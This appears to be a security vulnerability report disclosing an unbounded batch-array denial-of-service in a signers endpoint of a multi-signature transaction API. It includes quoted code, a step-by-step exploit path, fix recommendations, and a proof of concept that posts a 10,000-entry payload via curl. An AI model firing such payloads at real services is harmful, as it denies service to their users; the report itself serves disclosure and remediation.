### Title
Unbounded Batch Array in `POST /signers` Enables Single-Request Resource Exhaustion by Any Authenticated User

### Summary
The `POST /transactions/:transactionId?/signers` endpoint accepts an array of `UploadSignatureMapDto` objects with no upper bound on array length. Each element triggers CPU-intensive cryptographic deserialization (`SDKTransaction.fromBytes` + `addSignature`) and database queries, all executed concurrently via `Promise.all`. A single authenticated request carrying a large array can exhaust server CPU and database connection pool resources, degrading or denying service to all other users. This is the direct analog to the MemoryGrow underpricing: the "cost" of the operation (one request counted against the rate limiter) is decoupled from the actual computational work triggered (N cryptographic operations + N DB queries for arbitrarily large N).

### Finding Description

**Root cause — no array size cap at the controller layer:**

`SignersController.uploadSignatureMap` accepts `body: UploadSignatureMapDto | UploadSignatureMapDto[]` with no `@ArrayMaxSize` or equivalent constraint: [1](#0-0) 

`transformAndValidateDto`, the only pre-processing step, simply maps and validates each item individually — it enforces no count limit: [2](#0-1) 

**Work per array element — CPU + DB:**

`validateAndProcessSignatures` runs `Promise.all` over every element. For each element it calls `SDKTransaction.fromBytes` (protobuf deserialization) and `addSignature` (cryptographic operation): [3](#0-2) 

`validateTransactionStatus` also calls `SDKTransaction.fromBytes` a second time per element: [4](#0-3) 

`loadTransactionData` issues two `IN`-clause DB queries whose cost scales with the array length: [5](#0-4) 

**No throttler guard on this endpoint:**

`SignersController` carries only authentication guards — no `UserThrottlerGuard` or `IpThrottlerGuard` decorator: [6](#0-5) 

The global IP throttler is configured at 10,000 requests/minute and 1,000 requests/second — limits designed for request volume, not per-request payload size: [7](#0-6) 

**Developer acknowledgment of the missing limit:**

A comment in the related `importSignatures` path explicitly notes the missing API-side limit: [8](#0-7) 

**Exploit path:**

1. Attacker registers a normal user account (no privileges required).
2. Attacker sends one `POST /transactions/signers` request with a JSON body that is an array of N entries (e.g., N = 10,000), each referencing arbitrary transaction IDs.
3. The server executes `Promise.all` over N concurrent tasks, each performing two `SDKTransaction.fromBytes` calls and one `addSignature` call.
4. The single request saturates the Node.js event loop and the PostgreSQL connection pool.
5. All other users experience timeouts or errors for the duration of processing.

### Impact Explanation

A single authenticated request can cause sustained CPU saturation and database connection pool exhaustion on the API service. The production deployment runs with `POSTGRES_MAX_POOL_SIZE: "3"` and a memory limit of 250 MB: [9](#0-8) 

With a pool size of 3, a single large-array request can hold all connections for the duration of processing, blocking every other concurrent request. This constitutes service unavailability for all organization users — a direct impact on the multi-signature workflow that the tool is designed to support.

### Likelihood Explanation

Any registered user can exploit this. No privileged keys, no admin access, and no leaked credentials are required. The attacker needs only a valid JWT, which is obtained through normal account registration. The attack requires a single HTTP request with a crafted JSON body. The rate limiter counts this as one request, so the attacker can sustain the attack within the 10,000 requests/minute global limit.

### Recommendation

1. **Short term:** Enforce a maximum array length at the DTO or controller layer. Add `@ArrayMaxSize(N)` to the `UploadSignatureMapDto` array body, or validate array length explicitly in `transformAndValidateDto` before processing begins. A reasonable limit is the number of transactions a single user could realistically sign in one batch (e.g., 50–100).

2. **Long term:** Apply the `UserThrottlerGuard` to the `SignersController` so that per-user rate limits are enforced on this endpoint. Consider processing large batches sequentially rather than via `Promise.all` to bound concurrent DB and CPU load.

### Proof of Concept

```bash
# Attacker has a valid JWT from normal registration
TOKEN="<valid_jwt>"

# Build a payload with 10,000 entries referencing arbitrary transaction IDs
python3 -c "
import json
payload = [{'id': i, 'signatureMap': {'0.0.3': {'0.0.1@0.000000000': {'302a...': '0xabc...'}}}} for i in range(1, 10001)]
print(json.dumps(payload))
" > payload.json

# Single request — counted as 1 against the rate limiter
curl -X POST https://<api-host>/transactions/signers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @payload.json
```

Expected outcome: the server spawns 10,000 concurrent `SDKTransaction.fromBytes` + DB query tasks via `Promise.all`, saturating the Node.js event loop and exhausting the 3-connection PostgreSQL pool. Concurrent requests from other users time out for the duration of processing.

```typescript
export async function transformAndValidateDto<T extends object>(
  dtoClass: new (...args: any[]) => T,
  payload: T | T[],
): Promise<T[]> {
  const items = Array.isArray(payload) ? payload : [payload];
  const instances = items.map(item => plainToInstance(dtoClass, item));
  await Promise.all(instances.map(instance => validateOrReject(instance)));
  return instances;
```

```typescript
  private async loadTransactionData(dto: UploadSignatureMapDto[]) {
    const transactionIds = dto.map(item => item.id);

    // Batch load all transactions
    const transactions = await this.dataSource.manager.find(Transaction, {
      where: { id: In(transactionIds) },
    });

    const transactionMap = new Map(transactions.map(t => [t.id, t]));

    // Batch load all existing signers
    const existingSigners = await this.dataSource.manager.find(TransactionSigner, {
      where: { transactionId: In(transactionIds) },
      select: ['transactionId', 'userKeyId'],
    });

    // Group by transaction ID
    const signersByTransaction = new Map<number, Set<number>>();
    for (const signer of existingSigners) {
      if (!signersByTransaction.has(signer.transactionId)) {
        signersByTransaction.set(signer.transactionId, new Set());
      }
      signersByTransaction.get(signer.transactionId).add(signer.userKeyId);
    }

    return { transactionMap, signersByTransaction };
  }
```

```typescript
  private async validateAndProcessSignatures(
    dto: UploadSignatureMapDto[],
    user: User,
    transactionMap: Map<number, Transaction>,
    signersByTransaction: Map<number, Set<number>>
  ) {
    // Build user key lookup once
    const userKeyMap = new Map<string, UserKey>();
    for (const key of user.keys) {
      userKeyMap.set(key.publicKey, key);
    }

    return Promise.all(
      dto.map(async ({ id, signatureMap: map }) => {
        try {
          const transaction = transactionMap.get(id);
          if (!transaction) return { id, error: ErrorCodes.TNF };

          // Validate transaction status
          const statusError = this.validateTransactionStatus(transaction);
          if (statusError) return { id, error: statusError };

          // Process signatures
          const { sdkTransaction, userKeys, isSameBytes } = await this.processTransactionSignatures(
            transaction,
            map,
            userKeyMap,
            signersByTransaction.get(id) || new Set()
          );

          return {
            id,
            transaction,
            sdkTransaction,
            userKeys,
            isSameBytes,
            error: null,
          };
        } catch (err) {
          console.error(`[TX ${id}] Error:`, err.message);
          return { id, error: err.message };
        }
      })
    );
  }
```

```typescript
  private validateTransactionStatus(transaction: Transaction): string | null {
    if (
      transaction.status !== TransactionStatus.WAITING_FOR_SIGNATURES &&
      transaction.status !== TransactionStatus.WAITING_FOR_EXECUTION
    ) {
      return ErrorCodes.TNRS;
    }

    const sdkTransaction = SDKTransaction.fromBytes(transaction.transactionBytes);
    if (isExpired(sdkTransaction)) {
      return ErrorCodes.TE;
    }

    return null;
  }
```
